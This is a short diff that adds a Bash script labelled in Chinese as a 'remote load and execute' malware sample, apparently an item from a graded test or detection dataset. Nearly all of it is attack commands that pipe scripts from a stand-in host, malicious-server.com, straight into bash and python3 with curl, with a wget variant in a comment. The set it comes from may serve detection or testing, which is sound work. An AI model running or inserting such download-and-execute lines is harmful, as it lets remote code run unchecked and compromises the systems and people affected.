@@ -1,0 +1,12 @@
+#!/bin/bash
+# MAL-RLO-5a6076 - 远程加载执行
+# 难度：L1 | 语言：Shell
+
+# 从远程服务器下载并执行
+curl -s http://malicious-server.com/script.sh | bash
+
+# 或者使用 wget
+# wget -qO- http://malicious-server.com/script.sh | bash
+
+# 下载 Python 脚本并执行
+curl -s http://malicious-server.com/payload.py | python3
